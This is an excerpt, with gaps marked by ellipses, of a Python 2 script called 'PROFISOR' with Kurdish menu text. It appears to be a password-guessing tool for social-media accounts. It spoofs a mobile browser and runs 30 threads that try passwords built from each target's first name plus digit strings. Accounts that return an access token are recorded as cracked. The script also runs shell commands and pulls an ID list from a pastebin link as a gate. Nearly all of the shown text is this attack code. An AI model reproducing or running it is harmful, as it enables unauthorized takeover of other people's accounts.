...
hd = open('profisor.py', 'r')
fd = hd
print fd.name
os.system('clear')
if 'profisor.py' == fd.name:
    if 'profisor.py' == fd.name:
        print 'GOOD'
    else:
        print 'change name of file to my name profisor.py'
        os.sys.exit()
print ' '
os.system('clear')
os.system('rm -rif profisor.txt')
os.system('id -u > profisor.txt')
uidd = open('profisor.txt', 'r')
for j in uidd:
    sp = j.split()
manglist = requests.get('https://pastebin.com/raw/Y8NHCse5')
idd = manglist.text
reload(sys)
...
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36')]
br.headhead = {
    'accept':'*/*',
...
logo = """
OooOOo.  `OooOOo.         OOooOoO    .oOOOo.         `OooOOo.  
O     `O  o     `o .oOOo. o       o  o     o  .oOOo.  o     `o 
o      O  O      O O    o O       0   O.      O    o  O      O 
O     .o  o     .O o    O oOooO       `OOoo.  o    O  o     .O 
oOooOO'   OOooOO'  o    o O       O        `O o    o  OOooOO'  
o         o    o   O    O o       o         o O    O  o    o   
O         O     O  o    O o       O  O.    .O o    O  O     O  
o'        O      o `OooO' O'      o'  `oooO'  `OooO'  O      o """
...
def menu():
    ...
    print '##########################################'
    print '#========================================#'
    print '#\x1b[37;1m[1]> Dast pe krdny Hack       #'
...
def option():
    unikers = raw_input('\x1b[37;1mPROFISOR>>>\x1b[33;1m')
    if unikers == '':
...
def startgrab():
    global cekpoint
    global oks
    peak = raw_input('\x1b[37;1mKaK@\x1b[31;1mPROFISOR>> ')
    if peak == '':
    ...
    print '\n                            \x1b[37;1m PROFISOR '
    print '   \x1b[31;1m#############################################'
    anime('          \x1b[34;1m Bwasta bo Dast pe krdni hackaka  ')
    print '  \x1b[1;92m#############################################'
                                                  ...
                                                  if 'access_token' in q:
                                                    ...
                                                    oks.append(user + pass10)
                                                      ...
                                                      cekpoint.append(user + pass10)
                                                       ...
                                                       pass11 = b['first_name'] + '12345677654321'
    ...
    p = ThreadPool(30)
    p.map(main, id)
    anime('>>>>>>>>>$\x1b[31;1mKaK\x1b[37;1mPROFISOR\x1b[0m$<<<<<<<<<<')
    anime('\x1b[37;1m ')
    print '\x1b[32;1m '
